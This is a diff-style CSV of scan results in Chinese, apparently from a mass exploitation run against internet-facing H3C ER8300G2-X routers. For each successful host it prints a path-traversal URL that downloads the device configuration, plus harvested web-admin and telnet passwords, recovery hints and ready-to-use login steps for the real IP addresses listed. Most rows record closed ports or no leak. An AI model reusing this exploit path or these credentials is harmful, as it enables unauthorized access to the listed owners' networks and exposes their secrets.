+183.53.108.44,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.99.254,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.23.155.25,8089,否,配置泄露,,,,,端口未开放，跳过检测
+117.2.243.90,8080,否,配置泄露,,,,,端口未开放，跳过检测
+122.5.85.46,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+27.109.143.229,8080,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.38.234,9090,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.38.227,9090,否,配置泄露,,,,,端口未开放，跳过检测
+111.207.163.62,8888,是,配置泄露,H3C,ytsy2022@,ytsy2022@,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://111.207.163.62:8888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156267 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: ytsy2022@ (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: ytsy2022@ (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.106.0.20
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 111.207.163.62 8888
+       密码: ytsy2022@
+    2. Web登录: http://111.207.163.62:8888/userLogin.asp
+       密码: ytsy2022@
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+121.10.236.234,8443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.7.237.230,10443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+219.144.178.146,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+115.204.1.209,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.36.199,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.84.199,8089,否,配置泄露,,,,,端口未开放，跳过检测
+220.179.244.218,60000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.232.19.74,33890,否,配置泄露,,,,,端口未开放，跳过检测
+114.224.77.130,9001,否,配置泄露,,,,,端口未开放，跳过检测
+58.58.150.98,8099,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+121.31.110.239,55555,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+111.21.54.202,9999,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.31.21.226,8888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+61.142.118.171,8888,是,配置泄露,H3C,XINO88311598,XINO88311598,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://61.142.118.171:8888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 157183 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: XINO88311598 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: XINO88311598 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: DAXIE (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 154.39.248.98
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 61.142.118.171 8888
+       密码: XINO88311598
+    2. Web登录: http://61.142.118.171:8888/userLogin.asp
+       密码: XINO88311598
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+27.152.157.160,9000,否,配置泄露,,,,,端口未开放，跳过检测
+119.146.94.62,8443,是,配置泄露,H3C,As29108299,As29108299,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://119.146.94.62:8443/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 179470 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: As29108299 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: As29108299 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 久久精工 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.134.33
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 119.146.94.62 8443
+       密码: As29108299
+    2. Web登录: http://119.146.94.62:8443/userLogin.asp
+       密码: As29108299
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+113.89.18.1,9000,否,配置泄露,,,,,端口未开放，跳过检测
+183.6.69.170,999,否,配置泄露,,,,,端口未开放，跳过检测
+41.217.201.137,8080,是,配置泄露,H3C,Azxcvbnm123456,Azxcvbnm123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://41.217.201.137:8080/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 166720 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Azxcvbnm123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Azxcvbnm123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: luo (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 172.172.1.1
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 41.217.201.137 8080
+       密码: Azxcvbnm123456
+    2. Web登录: http://41.217.201.137:8080/userLogin.asp
+       密码: Azxcvbnm123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+220.250.2.222,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.41.137.94,8888,否,配置泄露,,,,,端口未开放，跳过检测
+183.58.3.139,999,是,配置泄露,H3C,Y2023@qq.com,Y2023@qq.com,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.58.3.139:999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159105 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Y2023@qq.com (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Y2023@qq.com (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: Y (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 0.0.0.0
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.58.3.139 999
+       密码: Y2023@qq.com
+    2. Web登录: http://183.58.3.139:999/userLogin.asp
+       密码: Y2023@qq.com
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+14.21.133.180,999,否,配置泄露,,,,,端口未开放，跳过检测
+120.196.58.249,888,否,配置泄露,,,,,端口未开放，跳过检测
+1.192.90.157,9090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+121.12.144.99,8091,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+49.64.134.66,10000,否,配置泄露,,,,,端口未开放，跳过检测
+60.16.60.50,10010,是,配置泄露,H3C,Hs512113.,Hs512113.,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://60.16.60.50:10010/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 165151 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Hs512113. (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Hs512113. (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 512113 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 60.16.60.50 10010
+       密码: Hs512113.
+    2. Web登录: http://60.16.60.50:10010/userLogin.asp
+       密码: Hs512113.
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.23.149.157,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.73.25,8089,否,配置泄露,,,,,端口未开放，跳过检测
+123.233.192.25,10010,否,配置泄露,,,,,端口未开放，跳过检测
+39.90.70.109,10010,否,配置泄露,,,,,端口未开放，跳过检测
+39.90.70.152,10010,否,配置泄露,,,,,端口未开放，跳过检测
+125.69.144.27,10010,否,配置泄露,,,,,端口未开放，跳过检测
+218.13.128.225,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+123.133.59.43,10010,否,配置泄露,,,,,端口未开放，跳过检测
+118.113.134.18,10010,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.224.193,10010,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.57.206,10001,否,配置泄露,,,,,端口未开放，跳过检测
+111.57.24.149,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+14.220.236.226,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.234.255.77,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+223.80.100.229,8888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.89.103.207,20000,否,配置泄露,,,,,端口未开放，跳过检测
+58.218.184.234,9090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.89.102.228,20000,否,配置泄露,,,,,端口未开放，跳过检测
+58.249.0.252,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.33.101.190,80,是,配置泄露,H3C,admin,lvdi123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://58.33.101.190:80/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 162382 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D020
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: lvdi123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.209.133
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 58.33.101.190 80
+       密码: lvdi123456
+    2. Web登录: http://58.33.101.190:80/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!"
+223.94.45.109,8082,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.23.154.219,8089,否,配置泄露,,,,,端口未开放，跳过检测
+115.236.24.91,9090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+171.213.218.229,18080,否,配置泄露,,,,,端口未开放，跳过检测
+14.110.198.150,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.110.198.95,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.99.106,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.66.144.130,9080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+117.25.182.35,9000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.33.101.190,8080,是,配置泄露,H3C,admin,lvdi123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://58.33.101.190:8080/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 162382 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D020
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: lvdi123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.209.133
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 58.33.101.190 8080
+       密码: lvdi123456
+    2. Web登录: http://58.33.101.190:8080/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!"
+118.114.160.191,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+14.220.247.109,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.242.36,4040,否,配置泄露,,,,,端口未开放，跳过检测
+222.181.10.2,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.233.160.44,9001,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+106.38.90.218,10018,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.170.72.99,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.195.221,8081,否,配置泄露,,,,,端口未开放，跳过检测
+120.237.109.202,22222,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.95.196.20,8090,否,配置泄露,,,,,端口未开放，跳过检测
+114.255.211.154,8180,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.202.226.64,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+211.136.243.195,8081,否,配置泄露,,,,,端口未开放，跳过检测
+117.176.129.55,9898,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.23.152.6,8089,否,配置泄露,,,,,端口未开放，跳过检测
+115.193.133.23,8081,否,配置泄露,,,,,端口未开放，跳过检测
+123.150.42.82,8888,是,配置泄露,H3C,Bhyybg25794130!,Bhyybg25794130!,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://123.150.42.82:8888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156553 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Bhyybg25794130! (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Bhyybg25794130! (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 219.150.32.132
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 123.150.42.82 8888
+       密码: Bhyybg25794130!
+    2. Web登录: http://123.150.42.82:8888/userLogin.asp
+       密码: Bhyybg25794130!
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+120.41.7.172,8888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+117.30.203.208,9000,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.111.100,82,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.16.223,9000,否,配置泄露,,,,,端口未开放，跳过检测
+60.208.119.154,10010,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.6.123.8,999,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.234.26.141,9000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.234.26.142,9000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+119.141.145.157,8000,是,配置泄露,H3C,edcokm,edcokm,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://119.141.145.157:8000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 161837 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: edcokm (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: edcokm (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: edc (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.128.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 119.141.145.157 8000
+       密码: edcokm
+    2. Web登录: http://119.141.145.157:8000/userLogin.asp
+       密码: edcokm
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+36.24.251.246,9001,否,配置泄露,,,,,端口未开放，跳过检测
+123.184.5.178,9888,是,配置泄露,H3C,LN@lexing2020,LN@lexing2020,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://123.184.5.178:9888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 163630 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: LN@lexing2020 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: LN@lexing2020 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 辽宁CK (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 123.184.5.178 9888
+       密码: LN@lexing2020
+    2. Web登录: http://123.184.5.178:9888/userLogin.asp
+       密码: LN@lexing2020
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+113.116.46.28,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.235,9090,否,配置泄露,,,,,端口未开放，跳过检测
+59.57.134.36,9000,否,配置泄露,,,,,端口未开放，跳过检测
+183.23.230.39,9999,否,配置泄露,,,,,端口未开放，跳过检测
+112.5.140.116,4000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.7.172.41,9898,否,配置泄露,,,,,端口未开放，跳过检测
+183.4.47.61,9898,否,配置泄露,,,,,端口未开放，跳过检测
+175.169.111.126,9888,否,配置泄露,,,,,端口未开放，跳过检测
+180.109.8.149,60443,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.17.176,10443,否,配置泄露,,,,,端口未开放，跳过检测
+60.186.61.243,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.118.132.202,88,否,配置泄露,,,,,端口未开放，跳过检测
+36.112.208.190,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+14.157.164.72,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.17.67,10443,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.144.26,8000,否,配置泄露,,,,,端口未开放，跳过检测
+122.100.142.199,8888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.37.139.144,9999,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.236.25,4040,否,配置泄露,,,,,端口未开放，跳过检测
+58.37.134.213,9999,否,配置泄露,,,,,端口未开放，跳过检测
+183.66.194.146,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+61.146.131.53,10008,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.58.151.158,10004,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.194.184.92,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.89.103.165,20000,否,配置泄露,,,,,端口未开放，跳过检测
+223.83.200.221,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.89.103.246,20000,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.222.12,18080,否,配置泄露,,,,,端口未开放，跳过检测
+183.23.190.190,9999,否,配置泄露,,,,,端口未开放，跳过检测
+220.184.70.44,10001,否,配置泄露,,,,,端口未开放，跳过检测
+183.23.148.109,8089,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.247.234,4040,否,配置泄露,,,,,端口未开放，跳过检测
+120.196.94.187,999,是,配置泄露,H3C,Y2023@qq.com,Y2023@qq.com,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://120.196.94.187:999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 157214 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D021
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Y2023@qq.com (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Y2023@qq.com (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 120.196.94.187 999
+       密码: Y2023@qq.com
+    2. Web登录: http://120.196.94.187:999/userLogin.asp
+       密码: Y2023@qq.com
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+60.176.163.247,8081,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.144.46,8000,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.184,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.153.91.154,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.120.194.191,8081,否,配置泄露,,,,,端口未开放，跳过检测
+121.8.35.94,8090,否,配置泄露,,,,,端口未开放，跳过检测
+106.39.19.242,8081,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+221.11.113.197,8888,是,配置泄露,H3C,18609140071,18609140071,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://221.11.113.197:8888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 161617 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D023
+  📋 提取的敏感信息:
+    🔑 Web管理密码: 18609140071 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: 18609140071 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 221.11.1.67
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 221.11.113.197 8888
+       密码: 18609140071
+    2. Web登录: http://221.11.113.197:8888/userLogin.asp
+       密码: 18609140071
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+113.65.4.215,8090,否,配置泄露,,,,,端口未开放，跳过检测
+110.87.91.226,9000,否,配置泄露,,,,,端口未开放，跳过检测
+221.229.247.202,9090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.116.45.134,9090,否,配置泄露,,,,,端口未开放，跳过检测
+121.13.240.114,8111,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+221.228.152.18,9001,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.148.26,8181,否,配置泄露,,,,,端口未开放，跳过检测
+123.161.69.72,28080,是,配置泄露,H3C,eas12345,eas12345,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://123.161.69.72:28080/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155370 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D021
+  📋 提取的敏感信息:
+    🔑 Web管理密码: eas12345 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: eas12345 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: jk (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 123.161.69.72 28080
+       密码: eas12345
+    2. Web登录: http://123.161.69.72:28080/userLogin.asp
+       密码: eas12345
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+61.178.240.13,12000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+117.60.170.203,10000,否,配置泄露,,,,,端口未开放，跳过检测
+115.238.70.62,82,否,配置泄露,,,,,端口未开放，跳过检测
+61.141.69.197,88,否,配置泄露,,,,,端口未开放，跳过检测
+122.242.254.55,8181,否,配置泄露,,,,,端口未开放，跳过检测
+61.134.41.162,8765,否,配置泄露,,,,,端口未开放，跳过检测
+183.12.133.90,999,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.18.117,8800,否,配置泄露,,,,,端口未开放，跳过检测
+122.231.100.55,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.38.86,9090,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.52.140,9443,否,配置泄露,,,,,端口未开放，跳过检测
+125.86.27.145,8989,否,配置泄露,,,,,端口未开放，跳过检测
+122.224.206.178,9001,是,配置泄露,H3C,zHamcHu&0202^yEaR0112!Dw1568CEs,zHamcHu&0202^yEaR0112!Dw1568CEs,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://122.224.206.178:9001/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 163539 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: zHamcHu&0202^yEaR0112!Dw1568CEs (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: zHamcHu&0202^yEaR0112!Dw1568CEs (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.101.172.35
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 122.224.206.178 9001
+       密码: zHamcHu&0202^yEaR0112!Dw1568CEs
+    2. Web登录: http://122.224.206.178:9001/userLogin.asp
+       密码: zHamcHu&0202^yEaR0112!Dw1568CEs
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.23.155.150,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.45.109,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.17.237,9000,否,配置泄露,,,,,端口未开放，跳过检测
+125.86.25.70,8989,否,配置泄露,,,,,端口未开放，跳过检测
+218.72.37.217,9001,否,配置泄露,,,,,端口未开放，跳过检测
+218.93.14.35,8081,否,配置泄露,,,,,端口未开放，跳过检测
+221.230.73.56,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.239.69,4040,否,配置泄露,,,,,端口未开放，跳过检测
+222.181.10.242,8989,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.209,10443,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.53.107,9443,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.25.78,1201,是,配置泄露,H3C,Leechen121,Leechen121,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://222.90.25.78:1201/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 158220 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Leechen121 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Leechen121 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 井 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 218.30.19.50
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 222.90.25.78 1201
+       密码: Leechen121
+    2. Web登录: http://222.90.25.78:1201/userLogin.asp
+       密码: Leechen121
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+14.155.219.37,1234,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.102.139,20000,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.101.112,20000,否,配置泄露,,,,,端口未开放，跳过检测
+120.234.97.234,8087,否,配置泄露,,,,,端口未开放，跳过检测
+183.23.227.221,9999,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.244.136,999,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.133.28,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.250.170.6,9180,是,配置泄露,H3C,sanTom9180,sanTom9180,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://58.250.170.6:9180/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 158775 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: sanTom9180 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: sanTom9180 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: Santom (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 58.250.170.6 9180
+       密码: sanTom9180
+    2. Web登录: http://58.250.170.6:9180/userLogin.asp
+       密码: sanTom9180
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+171.213.211.76,18080,否,配置泄露,,,,,端口未开放，跳过检测
+183.23.153.15,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.162.246,8089,否,配置泄露,,,,,端口未开放，跳过检测
